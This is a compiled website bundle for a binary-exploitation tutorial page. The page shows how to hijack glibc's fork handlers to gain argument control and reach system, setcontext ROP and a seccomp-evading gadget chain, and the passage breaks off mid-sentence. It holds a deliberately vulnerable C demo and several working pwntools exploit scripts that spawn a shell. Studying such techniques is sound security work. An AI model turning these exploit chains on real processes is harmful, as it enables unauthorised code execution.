"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3918],{3165:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>c,default:()=>h,frontMatter:()=>d,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"pwn/fork_gadget","title":"fork\\\\_gadget","description":"","source":"@site/pwn/pwn/fork_gadget.md","sourceDirName":"pwn","slug":"/pwn/fork_gadget","permalink":"/pwn/pwn/fork_gadget","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"description":"","sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"setcontext","permalink":"/pwn/pwn/setcontext"},"next":{"title":"CTF writeups","permalink":"/pwn/category/ctf-writeups"}}');var r=s(4848),t=s(8453);const d={description:"",sidebar_position:3},c="fork_gadget",a={},l=[{value:"Cheatsheet",id:"cheatsheet",level:2},{value:"What are the fork handlers?",id:"what-are-the-fork-handlers",level:2},{value:"2.28-2.35",id:"228-235",level:2},{value:"So what?",id:"so-what",level:3},{value:"Why does this happen?",id:"why-does-this-happen",level:3},{value:"Exploitation",id:"exploitation",level:3},{value:"Is that all we can do?",id:"is-that-all-we-can-do",level:3},{value:"gets",id:"gets",level:3},{value:"Seccomp strikes back!",id:"seccomp-strikes-back",level:3},{value:"2.28-2.29",id:"228-229",level:3},{value:"2.36+",id:"236",level:2},{value:"Revenge of the seccomp!",id:"revenge-of-the-seccomp",level:3},{value:"2.27 and prior",id:"227-and-prior",level:2},{value:"ret2rand",id:"ret2rand",level:3},{value:"But what about the locking?",id:"but-what-about-the-locking",level:4},{value:"Exploitation",id:"exploitation-1",level:4},{value:"Return of the seccomp",id:"return-of-the-seccomp",level:3},{value:"Detecting arguments to handlers",id:"detecting-arguments-to-handlers",level:2},{value:"fork -&gt; one_gadget",id:"fork---one_gadget",level:2}];function o(e){const n={a:"a",admonition:"admonition",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"fork_gadget",children:"fork_gadget"})}),"\n",(0,r.jsxs)(n.p,{children:["Some of you may be familiar with the exit handlers which are ran when calling ",(0,r.jsx)(n.code,{children:"exit()"}),". These are typically used to clean up anything before the program is terminated, but they're also quite useful for attackers to hijack code execution. They're ideal, because by overwriting the ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_atexit.c#L76",children:"__exit_funcs"})," array, you can specify functions to be called, along with a controlled argument. However, one downside is that, because they're popular for attackers, they employ pointer mangling on the function pointers."]}),"\n",(0,r.jsxs)(n.p,{children:["However there are other places where handlers like these are used, and one place I stumbled across when investigating the exit handlers, was the fork handlers, and after some investigation, I found some tricks to abuse the fork handlers to convert ",(0,r.jsx)(n.code,{children:"fork"})," into a constraintless one gadget."]}),"\n",(0,r.jsx)(n.h2,{id:"cheatsheet",children:"Cheatsheet"}),"\n",(0,r.jsx)(n.p,{children:"Below is a cheatsheet for all the tricks covered in this post:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://gist.github.com/sasha-999/bcafec8de9a5620d8b38d78b7e9693fc",children:"GIST"})}),"\n",(0,r.jsx)(n.h2,{id:"what-are-the-fork-handlers",children:"What are the fork handlers?"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"fork"})," has its own handlers for multiple situations:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"prepare_handler"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"parent_handler"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"child_handler"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["These are stored in a single array/linked list called ",(0,r.jsx)(n.code,{children:"fork_handlers"}),", which exists in a writable region of libc memory, so that more handlers can be added. In each case, all of the handlers of the corresponding type are executed in a specifc order. There are a few things that separate these from exit handlers:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[":white","_check_mark: No pointer mangling."]}),"\n",(0,r.jsxs)(n.li,{children:["\u274c"," No argument control."]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["So 1 step forward, and 2 steps back. However, while we don't get explicit argument control like with exit handlers, there are similar tricks to what we did in ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets",children:"ret2gets"}),". To see that, let's have a closer look at ",(0,r.jsx)(n.code,{children:"fork"})," across multiple versions, as the implementation of the handlers as changed, which also changes how we'd abuse them."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:s(4523).A+"",children:"Files used for the demos"})}),"\n",(0,r.jsx)(n.h2,{id:"228-235",children:"2.28-2.35"}),"\n",(0,r.jsxs)(n.p,{children:["(The specific version used here is ",(0,r.jsx)(n.code,{children:"2.35"}),")"]}),"\n",(0,r.jsxs)(n.p,{children:["Let's first have a look at what a ",(0,r.jsx)(n.code,{children:"fork_handler"})," looks like:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (71).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/include/register-atfork.h#L23",children:"fork_handler"})})})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"prepare_handler"}),": Handlers to prepare the process to ",(0,r.jsx)(n.code,{children:"fork"}),", so they're run ",(0,r.jsx)(n.em,{children:"before"})," the ",(0,r.jsx)(n.code,{children:"fork"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"parent_handler"}),": Handlers run as the ",(0,r.jsx)(n.em,{children:"parent"})," after the ",(0,r.jsx)(n.code,{children:"fork"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"child_handler"}),": Handlers run as the ",(0,r.jsx)(n.em,{children:"child"})," after the ",(0,r.jsx)(n.code,{children:"fork"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"dso_handle"}),": A unique id to identify which binary/shared library registered this handler."]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["These are stored in an array called ",(0,r.jsx)(n.code,{children:"fork_handlers"}),", which is defined as:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (70).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L22",children:"fork_handlers"})})})]}),"\n",(0,r.jsxs)(n.p,{children:['The way this definition works is by stating a few "parameters" using macros, then including ',(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c",children:"malloc/dynarray-skeleton.c"}),", which then defines a struct called ",(0,r.jsx)(n.code,{children:"fork_handler_list"}),", plus a bunch of handlers for this struct."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (59).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c#L125",children:"generic struct defintion"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["These ",(0,r.jsx)(n.code,{children:"dynarray"})," structures are dynamically allocated arrays, which can resize if needed. Usually they have an initial buffer before it goes to the heap. Evaluating this yields:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"struct fork_handler_list {\n        size_t size;\n        size_t allocated;\n        struct fork_handler* array;\n        struct fork_handler scratch[48];\n};\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"fork"})," is defined as follows:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (69).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/fork.c#L40",children:"__libc_fork"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["Here we call ",(0,r.jsx)(n.code,{children:"__run_fork_handlers"})," with ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/include/register-atfork.h#L37",children:"atfork_run_prepare"}),", indicating it wants to execute the ",(0,r.jsx)(n.code,{children:"prepare"})," handlers."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (68).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L107",children:"__run_fork_handlers"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["So now it will go through the array from the last element (for backwards compatibility reasons), executing each ",(0,r.jsx)(n.code,{children:"prepare_handler"})," if they exist. The methods ",(0,r.jsx)(n.code,{children:"fork_handler_list_size"})," and ",(0,r.jsx)(n.code,{children:"fork_handler_list_at"})," are some of methods automically defined when we defined ",(0,r.jsx)(n.code,{children:"fork_handler_list"}),", which just index the array and get the length (",(0,r.jsx)(n.code,{children:"used"}),") respectively. Locking may also be used, if there are multiple threads running."]}),"\n",(0,r.jsx)(n.h3,{id:"so-what",children:"So what?"}),"\n",(0,r.jsx)(n.p,{children:"At first glance, taking control of code execution doesn't seem to be very doable, mainly due to the fact that we seemingly have no argument control. However, if we dig deeper, and look at the disassembly, we'll notice something interesting."}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (73).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("code",{children:"__run_fork_handlers"})})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (74).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"__run_fork_handlers+288"}),": Locking ",(0,r.jsx)("code",{children:"atfork_lock"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["First it checks the first argument ",(0,r.jsx)(n.code,{children:"edi"}),", and if it's ",(0,r.jsx)(n.code,{children:"0"}),", then it means it should run the ",(0,r.jsx)(n.code,{children:"prepare"})," handlers. Then checks if it should use locking, if so, jump to ",(0,r.jsx)(n.code,{children:"+288"}),", where it will lock, then resume by jumping back to ",(0,r.jsx)(n.code,{children:"+23"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["But then something interesting happens. ",(0,r.jsx)(n.code,{children:"[fork_handlers]"})," is loaded into ",(0,r.jsx)(n.code,{children:"rbp"})," (which corresponds to ",(0,r.jsx)(n.code,{children:"fork_handlers->used"}),"), then is loaded into ",(0,r.jsx)(n.code,{children:"rdi"}),". How interesting! It then goes on to call the ",(0,r.jsx)(n.code,{children:"prepare_handler"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (75).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"__run_fork_handlers+84"}),": Decrements ",(0,r.jsx)("code",{children:"rbp"})," (the index)"]})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (76).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"__run_fork_handlers+48"}),": Calls the ",(0,r.jsx)("code",{children:"prepare_handler"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["So theoretically, controlling the field ",(0,r.jsx)(n.code,{children:"used"})," could grant us ",(0,r.jsx)(n.code,{children:"rdi"})," control."]}),"\n",(0,r.jsx)(n.h3,{id:"why-does-this-happen",children:"Why does this happen?"}),"\n",(0,r.jsxs)(n.p,{children:["The reason for this is the ",(0,r.jsx)(n.a,{href:"/pwn/pwn/rop-2.34+/ret2gets#io_stdfile_0_lock-in-rdi",children:"same reason"})," why ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets",children:"ret2gets"})," works. Let's go back to ",(0,r.jsx)(n.code,{children:"+84"})," (when the index is decremented):"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (77).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"__run_fork_handlers+84"}),": Calling ",(0,r.jsx)("code",{children:"__libc_dynarray_at_failure"}),"?"]})})]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"+91"})," checks the index ",(0,r.jsx)(n.code,{children:"rbp"})," is within the bounds of the array (less than ",(0,r.jsx)(n.code,{children:"used"}),"). If it's not, then it goes on to call ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray_at_failure.c#L23",children:"__libc_dynarray_at_failure"}),", interestingly setting a second argument, but not a first? Well that's because it already set the first argument: when ",(0,r.jsx)(n.code,{children:"used"})," gets loaded. It could load ",(0,r.jsx)(n.code,{children:"used"})," into any register, but chooses ",(0,r.jsx)(n.code,{children:"rdi"}),", because in the case where this error happens, it doesn't need to waste time loading it into ",(0,r.jsx)(n.code,{children:"rdi"})," again, because it's already there. "]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (78).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c#L250",children:"fork_handler_list_at"}),": Checks the bounds, and calls the failure function with the size and index."]})})]}),"\n",(0,r.jsx)(n.h3,{id:"exploitation",children:"Exploitation"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid setup() {\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nint main() {\n    setup();\n\n    printf("%p\\n", &fgets);\n    printf("Enter address, size and data: ");\n    unsigned long addr, size;\n    scanf("%zu %zu ", &addr, &size);\n    fgets((void*)addr, size, stdin);\n    fork();\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["To demonstrate this, we'll use the ",(0,r.jsx)(n.del,{children:"very realistic application"})," attack scenario above, where we have a libc leak, an arbitrary write, and a call to ",(0,r.jsx)(n.code,{children:"fork"})," we want to hijack."]}),"\n",(0,r.jsx)(n.p,{children:"We can start by writing some basic methods to create the structures:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"def header(addr, size):\n    return flat({\n        0x00: size,\n        # we don't need to control allocated\n        0x10: addr\n    })\n\ndef handler_array(*funcs):\n    assert funcs\n    data = bytearray(0x20*len(funcs) - 0x18)\n    for i, func in zip(range(0, len(data), 0x20), funcs[::-1]):\n        data[i:i+8] = p64(func)\n    return data\n"})}),"\n",(0,r.jsxs)(n.p,{children:["So we can use ",(0,r.jsx)(n.code,{children:"handler_array(libc.sym.system)"})," to craft an array that will execute ",(0,r.jsx)(n.code,{children:"system"}),", but we now need to control ",(0,r.jsx)(n.code,{children:"rdi"}),". We can do this by setting ",(0,r.jsx)(n.code,{children:"used"})," to some pointer to ",(0,r.jsx)(n.code,{children:"/bin/sh"}),". However if we use a regular address to point to the handler array, then the large ",(0,r.jsx)(n.code,{children:"used"})," field will cause it to access invalid memory, as it will access the last handler. So if we need ",(0,r.jsx)(n.code,{children:"used"})," to be an address, why don't we just alter the address of the handler array. As long as"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"fork_handlers->array[fork_handlers->used-1]\n"})}),"\n",(0,r.jsx)(n.p,{children:"points to our handler, then it'll work. We can forge such an address as follows:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"addr = (addr - (size-len(funcs))*0x20) % (1<<64)\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Of course this will create an \"address\" that's complete nonsense, but that doesn't matter, as it won't access the start of the array (unless ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L34",children:"__register_atfork"})," or ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L75",children:"__unregister_atfork"})," is used). Putting this all together, we can arrive at the following exploit:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'vuln\')\nlibc = ELF(\'libc\', checksec=False)\n\np = e.process()\n\nfgets = int(p.recvline(), 16)\nlog.info(f"fgets: {hex(fgets)}")\n\nlibc.address = fgets - libc.sym.fgets\nlog.info(f"libc: {hex(libc.address)}")\n\ndef header(addr, size):\n    return flat({\n        0x00: size,\n        0x10: addr\n    })\n\ndef handler_array(*funcs):\n    assert funcs\n    data = bytearray(0x20*len(funcs) - 0x18)\n    for i, func in zip(range(0, len(data), 0x20), funcs[::-1]):\n        data[i:i+8] = p64(func)\n    return data\n\ndef forge_split(addr, *funcs, rdi=None):\n    array = handler_array(*funcs)\n    if rdi is not None:\n        size = rdi\n        assert size >= len(funcs)\n        addr = (addr - (size-len(funcs))*0x20) % (1<<64)\n    else:\n        size = len(funcs)\n    return header(addr, size), array\n\ndef forge(addr, *funcs, rdi=None):\n    hdr, arr = forge_split(addr+0x18, *funcs, rdi=rdi)\n    return hdr + arr\n\naddr = libc.sym.fork_handlers\ndata = forge(addr, libc.sym.system, rdi=next(libc.search(b"/bin/sh\\x00")))\n\nassert b"\\n" not in data\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\n\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h3,{id:"is-that-all-we-can-do",children:"Is that all we can do?"}),"\n",(0,r.jsxs)(n.p,{children:["This is the basic payload, but we can do more than just this. Take for example, a case where seccomp is in place, and we don't have access to ",(0,r.jsx)(n.code,{children:"execve"}),", meaning calling ",(0,r.jsx)(n.code,{children:"system"})," is useless now! Is that all we can do with a function call with a controlled argument? ",(0,r.jsx)(n.del,{children:"Yes, thanks for reading."})]}),"\n",(0,r.jsxs)(n.p,{children:["This is where ",(0,r.jsx)(n.code,{children:"setcontext"})," comes in! I covered this already ",(0,r.jsx)(n.a,{href:"setcontext",children:"here"}),", but basically this allows us to get ROP through the use of a function resembling the ",(0,r.jsx)(n.code,{children:"sigreturn"})," syscall. We can substitute this in as follows:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'def setcontext(regs, addr):\n\tframe = SigreturnFrame()\n\tfor reg, val in regs.items():\n\t\tsetattr(frame, reg, val)\n\t# needed to prevent SEGFAULT\n\tsetattr(frame, "&fpstate", addr+0x1a8)\n\tfpstate = {\n\t0x00: p16(0x37f),\t# cwd\n\t0x02: p16(0xffff),\t# swd\n\t0x04: p16(0x0),\t\t# ftw\n\t0x06: p16(0xffff),\t# fop\n\t0x08: 0xffffffff,\t# rip\n\t0x10: 0x0,\t\t\t# rdp\n\t0x18: 0x1f80,\t    # mxcsr\n\t}\n\treturn flat({\n\t0x00 : bytes(frame),\n#\t0xf8: 0\t\t\t\t\t# end of SigreturnFrame\n\t0x128: 0,\t\t\t\t# uc_sigmask\n\t0x1a8: fpstate,\t\t\t# fpstate\n\t})\n\naddr = libc.sym.fork_handlers\n\naddr_ctx = addr+0x20\ndata = forge(addr, libc.sym.setcontext, rdi=addr_ctx) + setcontext({\n    "rdi": next(libc.search(b"/bin/sh\\x00")),\n    "rsi": 0,\n    "rdx": 0,\n    "rip": libc.sym.execve,\n    "rsp": addr_ctx+0x200\n}, addr_ctx)\nassert b"\\n" not in data\n'})}),"\n",(0,r.jsxs)(n.p,{children:["For demo purposes, I'm just executing ",(0,r.jsx)(n.code,{children:"execve"}),", but you can do much more with ",(0,r.jsx)(n.code,{children:"setcontext"}),"."]}),"\n",(0,r.jsx)(n.h3,{id:"gets",children:"gets"}),"\n",(0,r.jsxs)(n.p,{children:["Both of these examples require the ",(0,r.jsx)(n.code,{children:"/bin/sh"})," string or the ",(0,r.jsx)(n.code,{children:"SigreturnFrame"})," to already exist in memory, or be apart of the arbitrary write. But what if we don't have such a luxury? Well since ",(0,r.jsx)(n.code,{children:"rdi"})," will be controlled for every function call, we can use ",(0,r.jsx)(n.code,{children:"gets"})," to write data to the argument, before using it for ",(0,r.jsx)(n.code,{children:"system"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'addr = libc.sym.fork_handlers\ndata = forge(addr, libc.sym.gets, libc.sym.system, rdi=addr+0x200)\nassert b"\\n" not in data\n# could also be any command we wish\nextra_data = b"/bin/sh"\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\n\nif extra_data:\n    p.sendline(extra_data)\n\np.interactive()\n'})}),"\n",(0,r.jsxs)(n.p,{children:["Or ",(0,r.jsx)(n.code,{children:"setcontext"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'addr = libc.sym.fork_handlers\n\naddr_ctx = addr+0x20\ndata = forge(addr, libc.sym.gets, libc.sym.setcontext, rdi=addr_ctx)\nassert b"\\n" not in data\n\nextra_data = setcontext({\n    "rdi": next(libc.search(b"/bin/sh\\x00")),\n    "rsi": 0,\n    "rdx": 0,\n    "rip": libc.sym.execve,\n    "rsp": addr_ctx+0x200,\n}, addr_ctx)\nassert b"\\n" not in extra_data\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\n\nif extra_data:\n    p.sendline(extra_data)\n\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h3,{id:"seccomp-strikes-back",children:"Seccomp strikes back!"}),"\n",(0,r.jsxs)(n.p,{children:["Our good old ",(0,r.jsx)(n.del,{children:"friend"})," enemy seccomp isn't always easily defeated by ",(0,r.jsx)(n.code,{children:"setcontext"}),", because there's a nuisance I have yet to cover. If we have another look at ",(0,r.jsx)(n.code,{children:"setcontext"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (79).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"setcontext"}),": Calling ",(0,r.jsx)("code",{children:"sigprocmask"})," syscall."]})})]}),"\n",(0,r.jsxs)(n.p,{children:["We see that it executes a syscall ",(0,r.jsx)(n.em,{children:"before"})," it sets the context, with syscall number ",(0,r.jsx)(n.code,{children:"0xe"}),". This is ",(0,r.jsx)(n.code,{children:"sigprocmask"}),", and while it may not be on the radar of any blacklists, it could be easily left out of a whitelist (like ",(0,r.jsx)(n.code,{children:"seccomp"}),"'s strict mode), meaning this could invoke ",(0,r.jsx)(n.code,{children:"seccomp"}),"'s wrath."]}),"\n",(0,r.jsxs)(n.p,{children:["What if we tried to skip the syscall? It's a good suggestion, but a wrench in the plan here is the fact that it restores the pointer to the context in ",(0,r.jsx)(n.code,{children:"rdx"}),", not ",(0,r.jsx)(n.code,{children:"rdi"}),", so we'd need to control ",(0,r.jsx)(n.code,{children:"rdx"})," somehow."]}),"\n",(0,r.jsxs)(n.p,{children:["Wouldn't it be nice if we could convert our current ",(0,r.jsx)(n.code,{children:"rdi"})," control into ",(0,r.jsx)(n.code,{children:"rdx"})," control, because ",(0,r.jsx)(n.code,{children:"rdx"})," isn't used by ",(0,r.jsx)(n.code,{children:"__run_fork_handlers"}),". Well it turns out there is a gadget that can do just that!"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (80).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"mov rdx, rdi"})," gadget"]})})]}),"\n",(0,r.jsxs)(n.p,{children:["Exactly one in fact. However if you're anything like me (",(0,r.jsx)(n.del,{children:"and I surely hope not"}),"), you'd wonder where this came from, and is this something that's likely to come up across multiple versions of libc, because it would be nice if our techniques were portable(ish)."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (81).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("code",{children:"x/10i 0xc5044"})})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (83).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("code",{children:"__memset_erms"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["It seems to belong to a function ",(0,r.jsx)(n.code,{children:"__memset_erms"}),", which in hindsight makes sense. It explains the ",(0,r.jsx)(n.code,{children:"rep stos"})," instruction: it's filling the buffer with the character ",(0,r.jsx)(n.code,{children:"al"}),". And since ",(0,r.jsx)(n.code,{children:"rep stos"})," increments ",(0,r.jsx)(n.code,{children:"rdi"}),", it needs to save a copy, so that it can return that original pointer, as that's the ",(0,r.jsx)(n.a,{href:"https://man7.org/linux/man-pages/man3/memset.3.html#RETURN_VALUE",children:"defined behaviour"})," of ",(0,r.jsx)(n.code,{children:"memset"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["But why did it compile like this, and why is ",(0,r.jsx)(n.code,{children:"rdx"})," used, surely this could change, right? Well let's find out:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (85).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:["Using ",(0,r.jsx)("code",{children:"list"})," to find where it's defined."]})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (86).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S#L150",children:"__memset_erms"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["Turns it the reason it compiled that way, is because that's exactly how libc wanted it: it used assembly language (",(0,r.jsx)(n.code,{children:".S"})," is a common extension for assembly language files). From what I could see, this behaviour is also consistent across many versions, probably because there's no real reason to change it:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"It's simple, so not much to change in the first place."}),"\n",(0,r.jsx)(n.li,{children:"If it ain't broke, don't fix it."}),"\n",(0,r.jsx)(n.li,{children:"It's not actually used, it's just used for performance measuring."}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["Fantastic, we have a ",(0,r.jsx)(n.code,{children:"mov rdx, rdi"})," gadget! But one final snag, we ideally want to set ",(0,r.jsx)(n.code,{children:"rcx"})," or ",(0,r.jsx)(n.code,{children:"rdx"})," to ",(0,r.jsx)(n.code,{children:"0"})," before this gadget executes, so that ",(0,r.jsx)(n.code,{children:"rep stos"})," finishes immediately (i.e. doesn't run)."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/Screenshot 2024-08-25 001133.jpg",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:"Where to jump to + preconditions"})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (88).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:["Null ",(0,r.jsx)("code",{children:"rcx"})," gadgets"]})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (89).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:["Null ",(0,r.jsx)("code",{children:"rdx"})," gadgets"]})})]}),"\n",(0,r.jsx)(n.p,{children:"Putting this all together, we arrive at the following:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'addr = libc.sym.fork_handlers\n\naddr_ctx = addr+0x100\ndata = forge(addr, libc.sym.gets, libc.address+0xa85d8, libc.sym.__memset_erms+13, libc.sym.setcontext+45, rdi=addr_ctx)\nassert b"\\n" not in data\n\nextra_data = setcontext({\n    "rdi": next(libc.search(b"/bin/sh\\x00")),\n    "rsi": 0,\n    "rdx": 0,\n    "rip": libc.sym.execve,\n    "rsp": addr_ctx+0x200\n}, addr_ctx)\nassert b"\\n" not in extra_data\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\np.sendline(extra_data)\n\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h3,{id:"228-229",children:"2.28-2.29"}),"\n",(0,r.jsxs)(n.p,{children:["There's a weird edge case that I found with ",(0,r.jsx)(n.code,{children:"2.28-2.29"}),", which seems to coincide with the versions that didn't have the ",(0,r.jsx)(n.code,{children:"do_locking"})," argument (which was added in 